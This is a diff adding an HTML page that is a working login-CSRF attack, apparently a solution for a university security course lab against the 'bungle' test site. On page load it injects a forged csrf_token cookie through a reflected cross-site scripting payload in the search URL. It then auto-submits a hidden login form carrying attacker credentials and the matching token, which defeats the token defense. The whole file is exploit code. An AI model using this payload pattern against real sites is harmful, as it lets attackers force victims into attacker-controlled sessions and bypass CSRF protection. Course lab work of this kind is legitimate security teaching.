@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+</head>
+<body onload="document.forms['login'].submit();">
+    <iframe name="Z" id="frame" src="http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3Edocument.cookie%20=%27csrf_token=aa8420669340a09ef8852635b10aef85%27%3C/script%3E"></iframe>
+    <form 
+        name="login" 
+        action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=1&xssdefense=0" 
+        method="post"
+        target="Z"
+    >
+        <input type="hidden" name="username" value="attacker" />
+        <input type="hidden" name="password" value="l33th4x"/>
+        <input type="hidden" name="csrf_token" value="aa8420669340a09ef8852635b10aef85">
+    </form>
+</body>
+</html>
